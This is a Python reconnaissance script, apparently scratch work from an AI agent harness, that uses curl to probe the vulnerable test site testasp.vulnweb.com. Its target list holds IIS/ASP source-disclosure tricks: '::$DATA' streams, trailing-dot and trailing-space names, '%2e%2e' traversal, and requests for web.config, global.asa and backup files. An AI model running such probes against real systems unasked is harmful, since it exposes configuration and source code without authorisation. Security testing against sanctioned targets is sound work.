#!/usr/bin/env python3
import os, subprocess, time

BASE="http://testasp.vulnweb.com"
OUT="/home/taeuk/projects/llm-abliteration/hermes-harness/journal/web/testasp-vulnweb-jev-trial/scratch/recon_vti"
B=os.path.join(OUT,"bodies"); os.makedirs(B,exist_ok=True)
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) recon"

def probe(p, tries=4):
    metric="ERR\t0\t-"; hdrs=""
    for i in range(tries):
        cmd=["curl","-sS","--path-as-is","-m","25","-A",UA,
             "-o",os.path.join(B,"re_"+p.strip("/").replace("/","_").replace("%","pct").replace(":","col").replace(".","dot") or "root"),
             "-w","%{http_code}\t%{size_download}\t%{content_type}","-D","/dev/stdout",BASE+p]
        try:
            r=subprocess.run(cmd,capture_output=True,text=True,timeout=40)
            # stdout is headers then metrics (because -D /dev/stdout)
            lines=[l for l in r.stdout.strip().split("\n") if l.strip()]
            metric=lines[-1] if lines else "ERR\t0\t-"
            hdrs="\n".join(lines[:-1])
            if not metric.startswith("000") and not metric.startswith("ERR"):
                return metric, hdrs
        except Exception:
            pass
        time.sleep(1.5)
    return metric, hdrs

targets=[
 "/Default.asp","/acuforum/Default.asp","/acuforum/",
 "/Templates/MainTemplate.dwt.asp","/Templates/","/Templates",
 "/robots.txt","/trace.axd","/images/_vti_cnf/","/aspnet_client/",
 "/acuforum/%2e%2e/Default.asp","/Default.asp.","/Default.asp ","/Default.asp%20",
 "/Default.asp::$DATA","/Default.asp/","/styles.css::$DATA",
 "/_vti_cnf/Default.asp.cnf","/_vti_cnf/styles.css.cnf","/_vti_cnf/Images/logo.gif.cnf",
 "/acuforum/_vti_cnf/","/random_nonexistent_dir_xyz/","/zzz/","/Templates/MainTemplate.dwt.asp.bak",
 "/Default.asp%20.","/Default.asp.;","/_vti_cnf/Templates/MainTemplate.dwt.asp.cnf",
 "/web.config","/global.asa","/App_Data/","/bin/","/aspnet_client/system_web/4_0_30319/",
]
print("%-8s %-7s %-45s %s" % ("STATUS","SIZE","PATH","CT"))
print("-"*95)
for p in targets:
    m,h=probe(p)
    parts=m.split("\t")
    print("%-8s %-7s %-45s %s" % (parts[0], parts[1] if len(parts)>1 else "?", p, parts[2] if len(parts)>2 else ""))
